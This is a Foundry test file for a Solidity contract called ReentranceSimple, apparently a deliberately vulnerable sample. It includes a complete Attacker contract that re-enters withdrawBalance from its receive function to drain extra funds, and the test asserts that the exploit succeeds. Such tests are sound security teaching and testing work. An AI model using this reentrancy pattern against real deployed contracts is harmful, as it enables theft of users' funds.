
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentranceSimple} from "../src/ReentranceSimple.sol";

contract TestReentrancyReentranceSimple is Test {
    ReentranceSimple public victim;
    Attacker public _attacker;

    function setUp() public {
        victim = new ReentranceSimple();
        _attacker = new Attacker(address(victim));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        vm.assume(attackVal < address(this).balance);

        vm.deal(address(victim), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ReentranceSimple public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public depositedAmount;

    constructor(address victimAddress) { 
        victim = ReentranceSimple(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        depositedAmount = val;
        victim.addToBalance{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        victim.withdrawBalance();
        
        if (address(this).balance > initialSnapshot + depositedAmount) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            victim.withdrawBalance();
            attackCallCount++;
        }
    }
}
